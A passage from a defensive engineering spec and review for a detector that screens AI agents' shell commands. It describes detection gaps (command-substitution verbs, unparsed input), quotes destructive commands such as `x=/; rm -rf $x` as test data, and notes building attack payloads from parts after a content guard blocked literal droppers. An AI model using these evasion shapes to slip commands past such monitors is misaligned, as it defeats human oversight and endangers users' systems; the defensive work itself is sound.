scanCommandAST entry' the spec offers as an alternative.


**Missing changes the reviewer found**:

- **Installers** `internal/toolrisk/interpreter_body.go` - Beyond appending scanCommandAST: rewrite the :243-245 block comment, which asserts depth is fixed at 1 by construction. Add the `depth int` parameter here and at shellast_scan.go:146 (scanCommandAST) and :395 (interpreterExecFindings); no package-level state.
- **Installers** `internal/toolrisk/quoting_bypass_pin_test.go` - Existing pins written against the old flattening / old gate. Review and re-base alongside quoted_target_fp_test.go — the spec names only the latter.
- **Installers** `internal/toolrisk/shellast_scan_test.go` - Same: asserts current reapply behaviour with the byte-equivalence gate in place. Must be re-based when the gate is deleted at :184/:232/:283-285.
- **Installers** `internal/shellast/shellast_test.go` - Pins resolveWord's flattening output directly. Adding ExpandWord and changing buildCommand's argv construction changes what these assert.
- **Installers** `parity-vectors/command-quoting.json` - Its attack half is scored through preQuoteFixScan (quoted_target_fp_test.go:99-103, :204). Re-basing that simulator changes what this corpus measures; state explicitly whether the corpus's declared classes still hold under the new expander, or the re-base silently redefines the existing instrument.

**Collateral risk**: Verified NOT regressed: shellast.Decompose has exactly two consumers, and internal/mcprisk/mcprisk.go:262 uses only `shellast.InterpreterExec(in.Command, in.Args)` on pre-split args, so the Word-level change cannot reach MCP discovery. DLP, browser masking, Codex wire blocking, signed-bundle propagation and the supply-chain package gate share no code with this package. The three PROVEN-WORKING command-lane shapes are correctly pinned. NormalizedOnly is pre-existing at toolrisk.go:56-61 with `json:"normalizedOnly,omitempty"`, so setting it on more findings is wire-compatible in both directions and F8a's 'no deploy-order constraint' claim is verified true. The REAL collateral is the new-false-positive class described in problems[1]: a HIGH block landing on ordinary packaging/Makefile commands is precisely the mass-FP incident the brief names as a worse outcome than the bypass.

**Effort correction**: L is credible ONLY for the corrected IFS-scoped expander. As specced — blanket splitting on any unknown expansion — the FP-tuning loop it forces against a corpus that does not exist yet (F8c) pushes it to XL, and it would land the tuning cost on the CRITICAL half of the wave.


---

## F8b - Stop silently discarding unanalysable commands: opaque command word, parse failure, and dialect-scoped fail-closed

- **Severity**: HIGH
- **Side**: multi   **Effort**: L   **Root cause verdict**: CONFIRMED
- **Depends on**: F8a

### Root cause

Two silent-discard paths return a clean ALLOW for input the detector could not analyse at all — both a bypass and a violation of the honesty discipline, since an unanalysed command is currently reported exactly like an analysed-and-clean one.

(a) OPAQUE COMMAND WORD. shellast.go:363-366 gives a CmdSubst no literal text, so a verb supplied by `$(...)` resolves to Name="", and shellast_scan.go:184's `strings.TrimSpace(c.Name) == ""` clause then discards the entire segment. Measured on shipped code AND with the F8a expander applied: a command-substitution-supplied verb with a recursive-broad-permissions argument list is ALLOW. FINDINGS.md records this shape as NOT-PROVEN; it is CONFIRMED as a detection gap from source and by execution. Note the argument list resolves fully and is visible — only the verb is opaque — so the detector knows it cannot decide and says nothing.

(b) PARSE FAILURE. shellast_scan.go:146-149 returns nil when `Decompose` fails, documented as FAIL-OPEN at :19-21 and shellast.go:17-20. No finding, no marker, no telemetry — the AST lane's absence is indistinguishable from its silence.

BUT blanket fail-closed is NOT the answer, and this is where the brief's instruction must be executed carefully rather than literally. MEASURED: Decompose refused 2 of 47 realistic developer commands (4.3%) and BOTH were PowerShell control flow; on a second 32-command corpus it refused 4 (12%) — 2 PowerShell/cmd, 2 genuinely unterminated quotes. Zero ordinary POSIX commands failed. Because `toolrisk.Scan`'s `default:` branch (toolrisk.go:312-317) feeds ANY tool carrying a `command` field into the bash parser, and Windows is the shipping platform, blanket fail-closed would begin blocking PowerShell control flow immediately — exactly the mass-false-positive incident the brief warns is a worse outcome than the bypass.

### Evidence (read at origin/main)

- `C:/cwt/Installers/internal/shellast/shellast.go:363-366 (CmdSubst contributes no literal text -> Name=="")`
- `C:/cwt/Installers/internal/toolrisk/shellast_scan.go:184 (`|| strings.TrimSpace(c.Name) == ""` silently discards the segment)`
- `C:/cwt/Installers/internal/toolrisk/shellast_scan.go:146-149 (`if !ok { return nil }` — the fail-open parse path)`
- `C:/cwt/Installers/internal/toolrisk/shellast_scan.go:19-21 and internal/shellast/shellast.go:17-20 (the documented FAIL-OPEN invariant this spec revises)`
- `C:/cwt/Installers/internal/toolrisk/toolrisk.go:312-317 (default branch: ANY tool with a `command` field reaches the bash parser — why dialect scoping is mandatory)`
- `C:/cwt/Installers/internal/toolrisk/toolrisk.go:281-295 (the `bash` branch)`
- `C:/cwt/Installers/internal/toolrisk/class_catalog.go:29-52 (astClassSeverity + ClassCatalog — where new classes must be declared or the catalog test fails)`
- `C:/cwt/Installers/internal/toolrisk/toolrisk.go:466-486 (classConfidence — a new class must be ranked or it sorts at 0)`
- `C:/cwt/Installers/internal/toolrisk/toolrisk.go:489-504 (severityRank — INFO is decision-neutral, which is what makes shell-not-analyzed safe)`
- `C:/cwt/Installers/internal/daemon/ai_handlers.go:3320-3352 (decideToolRisk: an unspecified class falls to the `default:` arm)`
- `C:/cwt/Installers/internal/daemon/ai_handlers.go:3372-3390 (defaultToolDecision: HIGH->block, MEDIUM->warn — the old-backend tolerance property)`
- `C:/cwt/Installers/internal/daemon/ai_handlers.go:2503 and internal/daemon/ai_permission.go:98 (the two Scan call sites)`
- `Backend src/ai-security-policy/ai-security-policy.constants.ts:225-237 (AI_TOOL_RISK_{HIGH,MEDIUM,INFO}_CLASSES / AI_TOOL_RISK_CLASSES)`
- `Backend src/ai-security-policy/resolve-strictest-policy.ts:347 (assertClosedActionMap — rejects any action-map key outside the tuple; this is why backend deploys first)`
- `Backend packages/shared-contracts/toolrisk-classes.v1.json (vendored catalog mirror)`
- `Frontend types/vendored/toolrisk-classes.v1.json + components/admin/__tests__/ai-security-policy-toolrisk-class-parity.test.ts (third mirror and its parity spec)`

### Fix

Make unanalysable input a FIRST-CLASS, HONEST outcome instead of silence, and scope fail-closed to the dialect where it is safe.

THREE NEW CLASSES, declared in `astClassSeverity` (class_catalog.go) so the catalog cannot drift:
  - `shell-opaque-command-word` (MEDIUM): the segment's verb is an unresolvable expansion while its arguments resolved. MEDIUM, not HIGH, deliberately — `$(which python3) -V` and `$(npm bin)/eslint` are real developer idioms (measured ALLOW today) and a HIGH here would interrupt normal work. MEDIUM maps to warn/hold via defaultToolDecision and an admin can promote it to block per tenant.
  - `shell-unparsed` (HIGH): the input was routed to the POSIX lane and the POSIX parser refused it. HIGH -> block. This is the fail-closed arm and it is narrow by construction.
  - `shell-not-analyzed` (INFO): the input is not POSIX-shell dialect, so the POSIX lane did not run and makes no claim. INFO is decision-neutral (severityRank 1, ignored by decideTool per toolrisk.go:489-504) so it changes no verdict — it exists so the console can say 'this lane did not analyse this command' instead of implying a clean pass.

DIALECT ROUTING, applied in `Scan` before scanCommandAST is called, on BOTH the `bash` branch and the `default:` branch. A cheap deterministic classifier `shellDialect(toolName, cmd) -> posix | powershell | cmd | unknown`:
  - posix when the tool name is bash/sh/local_shell/shell/shell_command, OR the text carries POSIX-only structure (`&&`/`||`/`|` with a POSIX verb, `$(`, backtick, heredoc, `NAME=value ` prefix) and carries no PowerShell/cmd marker.
  - powershell on Verb-Noun cmdlet shape, `$env:`, `-eq`/`-ne`/`-Path`/`-Recurse`-style parameters, ForEach-Object, Write-Host, `.ps1`, or a `param(`/`foreach (`/`if (` control head.
  - cmd on `%VAR%`, `dir /b`, `cmd /c`, `.bat`.
  - unknown otherwise.
  Routing: posix -> run scanCommandAST, and on parse failure emit `shell-unparsed` HIGH. powershell/cmd -> do NOT run the POSIX parser at all; emit `shell-not-analyzed` INFO. unknown -> ATTEMPT the parse; on success analyse normally; on failure emit `shell-not-analyzed` INFO, NOT `shell-unparsed`. That last rule is what holds the blast radius at the measured floor: only an input POSITIVELY identified as POSIX shell can ever be blocked for being unparseable, which in both measured corpora means malformed POSIX (unterminated quotes) and nothing else.

OPAQUE COMMAND WORD: in reapplyCommandRules, replace the blanket `TrimSpace(c.Name)==""` skip with — if the name is empty AND the segment has resolved arguments AND the word that produced it contained an unquoted substitution, emit `shell-opaque-command-word`; otherwise (a bare assignment statement such as `x=/`, which legitimately has no command word) continue as today. Never guess the verb.

HONESTY COPY: `shell-not-analyzed` must surface with wording from the shipped register — 'this command was not analysed by the shell lane' / 'NOT MEASURED' — never 'no issues found'. `toolDecisionReason` (ai_handlers.go:3396) needs a branch per new class, and `toolrisk.Alternative` (alternatives.go) needs entries for shell-opaque-command-word and shell-unparsed so a block tells the developer what to do.

SEQUENCING: F8b MUST land after F8a. Shipping fail-closed while the expander still mis-resolves would block on inputs the detector is still wrong about.

### Changes

**Installers** - `internal/toolrisk/dialect.go`

NEW FILE. `func shellDialect(toolName, cmd string) string` returning posix/powershell/cmd/unknown, table-driven and deterministic (no clock, no env — mirror the package invariant at toolrisk.go:14-17). Export nothing; keep the marker tables adjacent to the function with a comment naming the measured corpus that justifies each marker.

**Installers** - `internal/toolrisk/shellast_scan.go`

Add `ClassOpaqueCommandWord = "shell-opaque-command-word"`, `ClassShellUnparsed = "shell-unparsed"`, `ClassShellNotAnalyzed = "shell-not-analyzed"` beside the existing class consts at :29-37. Change `scanCommandAST` (:146-159) to take the dialect and to return a `shell-unparsed` HIGH finding spanning [0,len(cmd)) on `!ok` when dialect==posix, a `shell-not-analyzed` INFO when dialect is powershell/cmd or when an unknown-dialect parse fails, and nil otherwise. In reapplyCommandRules (:184) replace the empty-Name blanket skip with the opaque-command-word emission described in fix.

**Installers** - `internal/toolrisk/toolrisk.go`

In `Scan` (:281-295 bash branch and :312-317 default branch) compute `shellDialect(toolName, cmd)` once and pass it to scanCommandAST; skip the AST call entirely for powershell/cmd. Add the three new classes to `classConfidence` (:466-486): shell-unparsed ~86, shell-opaque-command-word ~50, shell-not-analyzed ~5.

**Installers** - `internal/toolrisk/class_catalog.go`

Add the three classes to `astClassSeverity` (:29-37) with SeverityHigh / SeverityMedium / SeverityInfo. TestClassCatalog_SeveritiesMatchEmission fails until the emission sites agree — that is the intended guard. Regenerate the parity vector with `TOOLRISK_CLASSES_UPDATE=1 go test ./internal/toolrisk/` (classCount 40 -> 43, sha256 changes).

**Installers** - `internal/toolrisk/alternatives.go`

Add remediation strings for shell-opaque-command-word ('write the command with a literal executable name instead of a substitution') and shell-unparsed ('the command could not be parsed as a shell command — check for unbalanced quotes'). toolDecisionReason surfaces these to the developer at the block.

**Installers** - `parity-vectors/toolrisk-classes.v1.json`

Regenerated artefact (do not hand-edit). Mirror 1 of 3.

**Backend** - `packages/shared-contracts/toolrisk-classes.v1.json`

Mirror 2 of 3 — copy the regenerated file verbatim. NOTE this is a loose vendored JSON inside packages/shared-contracts; it is NOT part of the @ceragon/shared-contracts TypeScript source, so the workspace packages/shared-contracts and Ceragon-Intelligence/packages/shared-contracts copies are NOT touched (verified: the file exists in neither).

**Backend** - `src/ai-security-policy/ai-security-policy.constants.ts`

Add 'shell-unparsed' to AI_TOOL_RISK_HIGH_CLASSES, 'shell-opaque-command-word' to AI_TOOL_RISK_MEDIUM_CLASSES, 'shell-not-analyzed' to AI_TOOL_RISK_INFO_CLASSES (tuples at :225-237). Until this ships, assertClosedActionMap (resolve-strictest-policy.ts:347) rejects any policy naming these classes — the concrete reason for backend-first.

**Backend** - `src/ai-security-policy/ai-class-metadata.ts`

Add operator-facing metadata for the three classes. The shell-not-analyzed description must state the lane made NO claim (honesty discipline), never that the command was clean.

**Frontend** - `types/vendored/toolrisk-classes.v1.json`

Mirror 3 of 3 — copy the regenerated file verbatim. ai-security-policy-toolrisk-class-parity.test.ts fails until this matches.

**Frontend** - `components/admin/ai-security-policy-section.tsx`

Add the three classes to AI_TOOL_RISK_CLASSES / AI_TOOL_RISK_CLASS_META so they render on the Tool-Risk Actions board and are settable. Copy for shell-not-analyzed must read as a coverage statement ('not analysed by this lane'), never as a pass.

### Tests (each carries a defeat step)

- DIALECT ROUTER TABLE TEST over the measured corpora: every POSIX command classifies posix; every PowerShell/cmd command classifies powershell/cmd; the two genuinely-malformed POSIX inputs (unterminated single quote, unterminated double quote) classify posix AND produce shell-unparsed HIGH. DEFEAT STEP: force shellDialect to return `posix` unconditionally and confirm the PowerShell control-flow cases (`if (Test-Path ...) {...}`, `foreach ($f in ...) {...}`) flip from INFO to a HIGH block — that is the exact 4.3% incident this router exists to prevent, and a test that does not move under that edit is not exercising the router.
- OPAQUE-COMMAND-WORD PAIR: a command-substitution-supplied verb carrying a recursive-broad-permissions argument list must produce shell-opaque-command-word MEDIUM, while the benign idioms `$(which python3) -V` and `$(npm bin)/eslint --version` must NOT produce it at HIGH and must not block. DEFEAT STEP: restore the blanket `TrimSpace(c.Name)==""` skip and confirm the attack case flips to ALLOW with zero findings — this is the shape FINDINGS.md left NOT-PROVEN, so the test must demonstrate the gap rather than assume it.
- BARE-ASSIGNMENT NON-REGRESSION: a statement that legitimately has no command word (`x=/` alone, and the assignment half of `x=/; rm -rf $x`) must NOT emit shell-opaque-command-word. DEFEAT STEP: drop the 'has resolved arguments AND an unquoted substitution' condition and confirm the bare assignment starts emitting the class — proving the condition is what suppresses it rather than some accident of ordering.
- OLD-BACKEND TOLERANCE, exercised not asserted: run decideTool with a policy whose ToolRisk.Actions map omits all three new classes (i.e. today's deployed backend) and confirm shell-unparsed still blocks and shell-opaque-command-word still warns via the defaultToolDecision severity fallback at ai_handlers.go:3372-3390. DEFEAT STEP: change shell-unparsed's catalog severity to MEDIUM and confirm the same test now yields warn instead of block — proving the assertion reads the real severity path and is not hard-coded to the expected verdict.
- THREE-MIRROR CONTRACT PARITY: after regenerating parity-vectors/toolrisk-classes.v1.json, run the Installers catalog test, Backend ai-security-policy.tool-risk-class-parity.spec.ts, and Frontend ai-security-policy-toolrisk-class-parity.test.ts. DEFEAT STEP: update only the Installers copy and confirm BOTH consumer specs go red — if either stays green the parity spec is not actually reading the vendored file and the whole hand-sync guard is decorative.
- HONESTY-COPY ASSERTION: snapshot the operator-facing strings for shell-not-analyzed and assert they contain no pass/clean/safe language and do contain an explicit not-analysed statement. DEFEAT STEP: substitute 'no issues found' into the metadata and confirm the test fails — this guard exists precisely because the failure mode of this cluster is an honest negative being dressed up as a positive.

### Risks

THE FALSE-POSITIVE RISK LIVES ENTIRELY IN THIS SPEC, not in F8a. Measured floor: 4.3% parse failure on 47 realistic commands, 100% of it PowerShell. The dialect router is what converts that from 4.3% blocked to ~0% blocked, so the router's PowerShell/cmd recall is the single load-bearing property — a PowerShell command misclassified as posix becomes a HIGH block on ordinary developer work. The mitigation is structural rather than hopeful: `unknown` degrades to INFO, so only a POSITIVE posix classification can ever produce a block. Do not 'simplify' that asymmetry away.

DEPLOY ORDER IS BACKEND FIRST AND IT MATTERS. resolve-strictest-policy.ts:347 assertClosedActionMap rejects action-map keys outside the registered tuple, so an agent emitting these classes against today's backend produces classes an operator cannot tune from the console. Old-backend behaviour is nonetheless SAFE by construction: ai_handlers.go:3320-3352 routes an unspecified class to the `default:` arm and :3372-3390 maps HIGH->block / MEDIUM->warn, so shell-unparsed still blocks and shell-opaque-command-word still warns. New backend + old agent is a pure no-op (old agents never emit the classes). No shared-contracts TypeScript type changes, so no Intelligence-repo mirror work.

HONESTY REGRESSION RISK, the one to watch in review: `shell-not-analyzed` is an INFO row on a timeline that F32 already shows is polluted by bookkeeping rows. If it renders as a per-command user-facing event it will read as noise and get suppressed, taking the honesty signal with it. Specify it as a coverage/diagnostic attribute on the decision, not as its own timeline event.

DO NOT let `shell-unparsed` HIGH be softened to MEDIUM to make the corpus green. If the corpus shows unacceptable blocking, the correct fix is to tighten the posix classifier or fix the parser gap — never to downgrade the severity, which would recreate the silent pass this spec exists to remove.

### ADVERSARIAL REVIEW - verdict: NEEDS_REVISION

- MISSING CONTRACT MIRROR — AND THE SPECCED FRONTEND CHANGE DOES NOT COMPILE WITHOUT IT. The change entry says to add the three classes to `AI_TOOL_RISK_CLASSES / AI_TOOL_RISK_CLASS_META` in Frontend/components/admin/ai-security-policy-section.tsx. `AI_TOOL_RISK_CLASSES` is not defined there — it is imported at :56 from `@/types/ai-governance` and defined at Frontend/types/ai-governance.ts:1521, with `type AiToolRiskClass` at :1567. `AI_TOOL_RISK_CLASS_META` is typed `Record<AiToolRiskClass, {label, description}>` (section.tsx:223-226), so adding three keys without widening the tuple is a TypeScript error, and adding the tuple entries without META takes the whole board down (the file's own comment at :218-222: buildBoardRow dereferences `AI_TOOL_RISK_CLASS_META[cls].label` UNGUARDED — 'Add both or neither').
- MISSING FOURTH MIRROR. Frontend/app/ai-control-plane/ai-sessions/[id]/session-timeline-content.tsx holds a separate hand-synced tool-risk class→label map (`"chmod-broad-777": "world-writable permissions"` at :281, under a comment at :274-275 declaring it a mirror of Installers/internal/toolrisk). It is not in the change list and is not covered by the parity test, so the three new classes would surface in the session timeline as raw tokens — and for `shell-not-analyzed` that is precisely the surface where the honesty copy matters most.
- UNANALYSED WIRE / PRIVACY CHANGE. internal/daemon/ai_handlers.go:2588 is `if len(findings) > 0 { toolPreview = redactedPreviewFor(...) }`, and :2582-2586 records this as a LOCKED decision ('W2 (decision 9) — previews are FINDINGS-ONLY: a finding-free tool call ships class-free evidence with no preview body'). Emitting `shell-not-analyzed` INFO on every non-POSIX command makes every PowerShell and cmd tool call findings-bearing, so each one begins shipping a redacted preview of the command to the backend, and the backend's 'drops finding-free previews' backstop no longer applies. On Windows — the shipping platform — that is most of the traffic. Neither the changes nor the risks mention it.
- THE SPEC CONTRADICTS ITS OWN MITIGATION. risks says `shell-not-analyzed` must be 'a coverage/diagnostic attribute on the decision, not its own timeline event'. Every change entry implements it as a Finding class flowing through the normal finding pipeline, which is exactly what makes it a timeline event and trips the preview predicate above. Pick one and write it into changes; as it stands an implementer follows the changes and ships the thing the risks section warns against.
- THE ROLLOUT GATE POINTS AT AN UNBUILDABLE INSTRUMENT. 'F8b ships only if POSIX-classified parse failure is <0.5% of real traffic' is delegated to F8c's replay scorer, which has no data source (see F8c problems[1]). As written, F8b's fail-closed arm is gated on a number that cannot be produced.
- MINOR: 'Add the three classes to astClassSeverity (:29-37)' — astClassSeverity is class_catalog.go:31-35; :29-30 is its comment. And 'class consts at :29-37' in shellast_scan.go is the const block at :33-37. Harmless, but an implementer inserting at a line number rather than a symbol will land in a comment.

**Corrected root cause**: Root cause CONFIRMED as written; I verified every citation. shellast.go:363-366 gives CmdSubst no literal text so a substitution-supplied verb yields Name==""; shellast_scan.go:184's `|| strings.TrimSpace(c.Name) == ""` then discards the whole segment; :146-149 is verbatim `if !ok { return nil }` with the FAIL-OPEN invariant documented at :19-21 and shellast.go:17-20; toolrisk.go:312-317 is the `default:` branch that feeds ANY tool carrying a `command` field into the same bash parser. The dialect-scoped design and specifically the 'unknown degrades to INFO, only a POSITIVE posix classification can block' asymmetry are the right call and I would not weaken them. The old-backend tolerance claim is verified correct: ai_handlers.go:3324-3352 routes a class with no policy entry into `unspecified`, and :3372-3386 defaultToolDecision maps HIGH→block / MEDIUM→warn / INFO→ignored. Three further safety claims I checked and can confirm rather than object to: taintRisky at internal/daemon/ai_taint.go:160-164 explicitly skips SeverityInfo, so an INFO coverage class does NOT convert every PowerShell command into a taint hold; dedupeAndRank at toolrisk.go:531-551 resolves overlaps only within the SAME class, so a whole-command-span finding cannot suppress a real one; and severityRank at :491-504 plus defaultToolDecision do make INFO decision-neutral.


**Corrected approach**: Two repairs, both small.\n\n(1) COMPLETE THE MIRROR SET. It is four Frontend-side surfaces, not two. `AI_TOOL_RISK_CLASSES` and `type AiToolRiskClass` live at Frontend/types/ai-governance.ts:1521 and :1567 — the section component only imports the tuple at :56 and defines `AI_TOOL_RISK_CLASS_META` at :223 as `Record<AiToolRiskClass, …>`. Adding META entries without extending the tuple in ai-governance.ts does not compile, and the parity test (components/admin/__tests__/ai-security-policy-toolrisk-class-parity.test.ts) reads the tuple from `@/types/ai-governance`. Separately, app/ai-control-plane/ai-sessions/[id]/session-timeline-content.tsx carries its own hand-synced class→label map (chmod-broad-777 at :281, comment at :274-275 'mirror Installers/internal/toolrisk'); a class missing there renders the raw token to the operator.\n\n(2) KEEP `shell-not-analyzed` OFF THE EVIDENCE WIRE. ai_handlers.go:2588 gates redacted tool-preview emission on `len(findings) > 0` under a locked decision documented at :2582-2586 ('previews are FINDINGS-ONLY'). Emitting an INFO coverage class on every PowerShell/cmd command makes every such command findings-bearing, so every PowerShell tool call starts shipping a redacted preview of its command text to the backend. Add an explicit coverage-class exclusion at :2588 (and at whatever timeline-event emission the console renders), so the class is a coverage attribute on the decision — which is what the spec's own risks paragraph demands and which no change entry currently implements. Do NOT solve this by suppressing the class: that would recreate the silent pass.\n\n(3) Fix the gate dependency: F8b's rollout gate points at F8c's replay tool, which has no data source (see the F8c review). Re-point it at the in-process counters described there.


**Missing changes the reviewer found**:

- **Frontend** `types/ai-governance.ts` - Add 'shell-unparsed', 'shell-opaque-command-word', 'shell-not-analyzed' to the AI_TOOL_RISK_CLASSES tuple at :1521 (AiToolRiskClass at :1567 derives from it). Without this the AI_TOOL_RISK_CLASS_META additions in ai-security-policy-section.tsx do not typecheck and the parity test still fails.
- **Frontend** `app/ai-control-plane/ai-sessions/[id]/session-timeline-content.tsx` - Fourth hand-synced mirror: add operator-facing labels for the three classes to the tool-risk class→label map (the block containing 'chmod-broad-777' at :281). shell-not-analyzed's label must read as a coverage statement, never as a clean result.
- **Installers** `internal/daemon/ai_handlers.go` - At :2588, exclude coverage-only classes (shell-not-analyzed) from the `len(findings) > 0` findings-bearing predicate that gates redacted tool-preview emission, so the class does not silently expand what leaves the endpoint on every PowerShell command. Same exclusion wherever the console timeline event is emitted.

**Collateral risk**: The dialect router's PowerShell recall is correctly identified as the single load-bearing property and the unknown→INFO degrade is a real structural mitigation, not a hope. Nothing here touches DLP, browser masking, Codex wire blocking, signed-bundle propagation/anti-rollback, or the supply-chain package gate. MCP discovery-to-console is untouched (mcprisk does not call Decompose). The unflagged collateral is the evidence-wire expansion in problems[3]: previews for every PowerShell command is a privacy-surface change made by accident, not by decision, and it would be shipped under a comment that says the opposite.

**Effort correction**: L is still right but sits at the top of the range: the Frontend half is roughly double the specced size once types/ai-governance.ts, the session-timeline label map, and the ai_handlers.go:2588 exclusion are added, and three parity specs across three repos must go green together.


---

## F8c - Corpus + real-traffic replay instrument that gates the F8 rollout, plus a measured verdict on the PowerShell lane

- **Severity**: HIGH
- **Side**: agent   **Effort**: M   **Root cause verdict**: CONFIRMED
- **Depends on**: F8a, F8b

### Root cause

Not a product defect — this is the measurement obligation the brief attaches to F8a/F8b, and it is a real gap: no corpus in the repo exercises shell EXPANSION at all. `parity-vectors/command-quoting.json` covers quoting only (its own description scopes it to the QA-0802 quoted-target anchor fix), so the F8 transform family has no before/after instrument and the fail-closed blast radius has no measured number beyond the 47-command corpus I hand-built during this investigation. Shipping F8b without one turns a correctness fix into an availability incident.

Separately, the PowerShell lane's exposure is unmeasured. Source-confirmed: there is NO PowerShell tokenizer anywhere in the agent. PowerShell reaches the detector only as flat regex over the raw string (toolrisk.go:140 powershell-download-exec, :158 firewall-disable Set-MpPreference) plus the `-EncodedCommand` base64/UTF-16LE decode at shellast.go:597-659, whose decoded body then re-enters commandRules as flat regex (shellast_scan.go:404-414). mvdan.cc/sh cannot parse PowerShell and no Go PowerShell parser is vendored. So the SAME evasion CLASS exists there — backtick escape, string concatenation into `&`/`iex`, `-join` — but by a different mechanism (no parser at all, rather than a lossy one), and closing it is a separate parser programme, not part of F8.

### Evidence (read at origin/main)

- `C:/cwt/Installers/parity-vectors/command-quoting.json (description field scopes it to the quoted-target fix; contains no expansion fixtures)`
- `C:/cwt/Installers/internal/toolrisk/quoted_target_fp_test.go:1-90 (the before/after delta instrument pattern to copy: preQuoteFixScan baseline, per-class delta, gate = no benign command may GAIN a class)`
- `C:/cwt/Installers/internal/toolrisk/quoted_target_fp_test.go:60-77 (loadQuotingCorpus — refuses a one-sided corpus; reuse that guard)`
- `C:/cwt/Installers/internal/toolrisk/adversarial_wsg_test.go:78-108 (TestWSG_ShellObfuscation_FalsePositiveGuard — the existing benign battery to extend)`
- `C:/cwt/Installers/.github/workflows/holdout-score.yml and .github/workflows/pr-checks.yml (the CI lanes that already consume parity-vectors)`
- `C:/cwt/Installers/internal/neutraleval/holdout_seal_test.go (existing holdout-scoring harness)`
- `C:/cwt/Installers/internal/toolrisk/toolrisk.go:140 (powershell-download-exec — flat regex, no tokenizer)`
- `C:/cwt/Installers/internal/toolrisk/toolrisk.go:158 (firewall-disable Set-MpPreference — flat regex)`
- `C:/cwt/Installers/internal/shellast/shellast.go:507-543 (powershellInlineFlagKind — flag vocabulary only, not a parser)`
- `C:/cwt/Installers/internal/shellast/shellast.go:597-659 (InterpreterExecInfo — -EncodedCommand decode; the only PowerShell depth that exists)`
- `C:/cwt/Installers/internal/toolrisk/shellast_scan.go:404-414 (decoded body re-enters commandRules as flat regex)`
- `C:/cwt/Installers/internal/toolrisk/toolrisk.go:10-14 (Finding never carries the raw tool value — the wire-safety invariant the replay tool must inherit)`
- `C:/cwt/Installers/go.mod (no PowerShell parser vendored; mvdan.cc/sh parses POSIX only)`

### Fix

Build the instrument FIRST, run it, and let its numbers decide whether F8b ships as specified — copying the pattern the repo already proved during the quoted-target wave rather than inventing one.

(1) `parity-vectors/command-expansion.json`, same two-sided shape as command-quoting.json (`benign` + `attack`, both required, loader refuses a one-sided corpus).
  ATTACK half — one control/attack PAIR per transform per structural rule, every payload BUILT FROM PARTS IN THE TEST and never written as a literal executable string (our own content-lane guard correctly blocks literal droppers and blocked me twice while building this spec; treat that as a design constraint). Each entry carries `bare` (the literal-space control), `cmd` (the transformed twin), and the `class` + severity both must produce. Transform axis: braced field-separator expansion; unbraced form; operator form of the same expansion; ANSI-C hex-space quoting; backslash-escaped character inside the command word; line continuation before the target; command-substitution-supplied verb; and each of the above nested one level inside an interpreter inline-code body. Rule axis: destructive-rm, chmod-broad-777, destructive-dd, destructive-devwrite, pipe-to-shell, base64-pipe-shell, git-history-destroy, devoid-self-disable, firewall-disable, docker-socket-abuse. Include the NOT-PROVEN shapes explicitly with an expected verdict recorded either way, so 'not proven' becomes 'measured'.
  BENIGN half — the population actually at risk: unquoted variables in every position, quoted unknown variables, `$(...)` in argument and verb position, globs, brace expansion, tilde, heredocs, `NAME=value cmd` prefixes, subshells, xargs/`find -exec` wrappers, and a full PowerShell/cmd block (control flow, cmdlet pipelines, `$env:`, `.ps1` invocation) since those exercise the dialect router. Carry forward the pre-existing flat-regex false positive I measured (`rm -rf $HOME/<subpath>` blocks today on unmodified shipped code) marked KNOWN-PRE-EXISTING so the delta instrument does not attribute it to F8.

(2) `internal/toolrisk/expansion_fp_test.go`, modelled line-for-line on quoted_target_fp_test.go: score every benign entry under a BEFORE simulator and under the shipped scan, per class, and FAIL naming the command and the class if any benign entry GAINS a class. Attack entries must produce the same class AND the same severity as their `bare` control — severity equality is the property that matters to an operator.

(3) REAL-TRAFFIC REPLAY, `cmd/ai-shell-corpus-score/main.go`. Reads the endpoint's own recorded tool-check inputs from the local decision/event store and reports total commands, dialect histogram, parse-failure rate split by dialect, and the per-class finding delta between the shipped and the new scanner. It MUST run entirely on the endpoint and emit ONLY counts, dialects and class names — never a command string, since real command strings carry secrets (same wire-safety invariant as toolrisk.Finding at toolrisk.go:10-14). This box is the ideal corpus: FINDINGS.md records 816 allow + 6 block decisions on CND34521VN. ROLLOUT GATE, stated as a number: F8b ships only if POSIX-classified parse failure is <0.5% of real traffic and every failing command is independently confirmed malformed. If it is higher, fix the classifier or the parser — never downgrade shell-unparsed to make the number look good.

(4) POWERSHELL VERDICT — measure, do not build. Extend the replay to count how many real commands are PowerShell-dialect and how many of those carry any tool-risk finding at all. Write the answer to the roadmap as its own item with the source facts pinned above (no tokenizer exists; mvdan cannot parse PowerShell; nothing is vendored). RECOMMENDATION: keep it OUT of F8 — a PowerShell parser is a comparable-sized programme to F8a and bundling it would delay the CRITICAL fix. State the exposure honestly in the interim, which is exactly what `shell-not-analyzed` (F8b) exists to make visible, rather than leaving it implied-clean.

### Changes

**Installers** - `parity-vectors/command-expansion.json`

NEW. Two-sided corpus per the fix. Schema mirrors command-quoting.json: {version, description, benign:[{name,cmd,why}], attack:[{name,cmd,bare,class}]}. The description field must record the transform axis, the rule axis, and the payloads-built-from-parts rule so a later maintainer does not paste literals.

**Installers** - `internal/toolrisk/expansion_fp_test.go`

NEW. Loader + before/after delta instrument copied from quoted_target_fp_test.go. TestExpansion_BenignCorpusGainsNothing is the FP gate; TestExpansion_AttackPairsMatchBareControl asserts class AND severity equality with the `bare` twin; TestExpansion_NestedInInterpreterBody covers the depth-1 nesting hole. Assemble every payload from string parts inside the test — never store an executable literal.

**Installers** - `cmd/ai-shell-corpus-score/main.go`

NEW. Offline, endpoint-local replay scorer. Reads recorded tool-check command inputs, emits counts / dialect histogram / parse-failure-by-dialect / per-class delta. MUST NOT print, log, or write any command text. Ship with a test proving the output contains no input substring — that is the wire-safety guard and the only thing between this tool and a secret leak.

**Installers** - `.github/workflows/pr-checks.yml`

Add the expansion corpus test to the same lane that already runs the parity-vector tests, so the FP gate cannot be bypassed by a green local run.

**Installers** - `internal/toolrisk/adversarial_wsg_test.go`

Extend TestWSG_ShellObfuscation_Battery with one representative of each confirmed transform, and TestWSG_ShellObfuscation_FalsePositiveGuard with the PowerShell/cmd block, so the milestone battery reflects the F8 class. Do not move the corpus into this file — the JSON corpus is the instrument, this file is the labelled milestone proof.

### Tests (each carries a defeat step)

- CORPUS SHAPE GUARD: the loader must reject a corpus missing either half, exactly as loadQuotingCorpus does at quoted_target_fp_test.go:60-77, and must additionally reject an attack entry whose `bare` control does not itself produce the declared class. DEFEAT STEP: delete the benign array and confirm the loader fails with the one-sided-corpus message; then point one attack entry's `bare` at a genuinely harmless command and confirm the second guard fires — a corpus whose controls do not fire measures recall against nothing.
